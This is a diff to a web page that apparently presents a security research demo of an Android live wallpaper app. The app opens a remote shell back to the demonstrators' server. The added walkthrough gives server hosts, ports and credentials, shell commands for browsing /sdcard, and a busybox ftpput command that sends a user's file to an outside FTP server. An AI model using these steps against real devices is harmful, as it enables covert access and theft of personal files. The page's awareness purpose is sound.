@@ -72,8 +72,12 @@
             <div class="row">
                 <div class="col-lg-12">
                     <h1>Android Live Wallpaper Trust Exploit</h1>
-                    <p><strong>Usage Instructions:</strong> Make sure to include the <code>scrolling-nav.js</code>, <code>jquery.easing.min.js</code>, and <code>scrolling-nav.css</code> files. To make a link smooth scroll to another section on the page, give the link the <code>.page-scroll</code> class and set the link target to a corresponding ID on the page.</p>
-                    <a class="btn btn-default page-scroll" href="#demo">Click Me to Scroll Down!</a>
+                    <p>This is a site to demonstrate the exploit of user trust on Android using a Live Wallpaper as a plausible example.</p>
+                    <p>The basic premise is that the user needs to be wary of permissions when they install an application on Android.</p>
+                    <p>We demonstrate how this trust can be violated by gaining shell access to the device and executing arbitrary commands.</p>
+                    <p>One point of note is how full-network access permission is not required to send data to the Internet, only to receive it.</p>
+                    <p>Even more notable is that this permission is almost entirely hidden in later versions of Android, belittling the risk.</p>
+                    <p><a class="page-scroll" href="#demo">The demo guide</a> can be found below, along with the <a class="page-scroll" href="#downloads">app, source code and research document.</a></p>
                 </div>
             </div>
         </div>
@@ -85,6 +89,34 @@
             <div class="row">
                 <div class="col-lg-12">
                     <h1>Demo Section</h1>
+                    <p>The first step of the demo is to visit the interactive terminal page, which can be
+                        <a href="https://wallpaperexploit.ddns.net:8000/">found here.</a></p>
+                    <p>You should see a dark grey page with a Terminal: SSH box in the middle. If the Terminal: SSH option doesn't appear,
+                    refresh the page. This can be a first-view issue.</p>
+                    <p>Click on the Terminal: SSH box to start a new terminal. It will request the following information:</p>
+                    <p>Host/IP: <code>wallpaperexploit.ddns.net</code> Port: <code>2222</code> User: <code>demo</code> Password: <code>demopassword</code></p>
+                    <p>After entering all the info, the server is now waiting for a connection from your device.</p>
+                    <p>Now you have to install the app, which can be found under the <a class="page-scroll" href="#downloads">downloads section.</a></p>
+                    <p>After you download and install the app, go to your settings, display and wallpapers, and set cube as your wallpaper.</p>
+                    <p>Setting the wallpaper attempts a connection with the server, and you may notice the new connection in the terminal.</p>
+                    <p>Try entering <code>ls</code> to see if it's working. If a few files are listed, you're ready to go!</p>
+                    <p>You now have shell access to your Android device. This isn't root access, but you still have a scary amount of power!</p>
+                    <p>Feel free to poke around you device now if you're familiar with shell commands, but I'll give an example below.</p>
+                    <p>For some reason <code>cd</code> has a glitch in this configuration, so you will need to put a space after any <code>cd ..</code>
+                        command or the tunnel will close.</p>
+                    <p>To close the tunnel intentionally, type exit in the terminal or change you wallpaper and reboot your device.</p>
+                    <p>For a good example of how this could be used maliciously, I've included the example of uploading one of your file.</p>
+                    <p>To try this out, browse to some of your files, like in <code>Download</code> or <code>DCIM/Camera</code>, so try <code>cd /sdcard/Download</code> and then <code>ls</code> to find a file</p>
+                    <p>Once you have found a suitable file to transfer, we can move it to the app directory with <code>cp FILENAME /data/data/com.example.android.livecubes/files</code></p>
+                    <p>Now that it is in the app files, we can move back to that folder with <code>cd /data/data/com.example.android.livecubes/files</code></p>
+                    <p>Lastly, we use <code>./busybox ftpput -u ftpdemo -p ftppassword -P 2121 13.68.212.90 /files/FILENAME FILENAME</code></p>
+                    <p>For those interested, more information on busybox can be <a href="https://busybox.net/">found here.</a></p>
+                    <p>The version used in this app may be a little outdated, but still adds a lot of commands to our shell!</p>
+                    <p>The file should now be located on the FTP server I set up for this demo, which you can check for youself with the same credentials.</p>
+                    <p>Host/IP: <code>wallpaperexploit.ddns.net</code> Port: <code>2121</code> User: <code>ftpdemo</code> Password: <code>ftppassword</code></p>
+                    <p>Use an FTP client like WinSCP, Filezilla, etc. to see the file with the above credentials, and delete it afterwards.</p>
+                    <p>All uploaded files will be periodically removed, but it's always good to be safe!</p>
+                    <p>Beyond peeking at your files, the shell access can execute other commands. This is theorized in the <a class="page-scroll" href="#downloads">document below.</a></p>
                 </div>
             </div>
         </div>
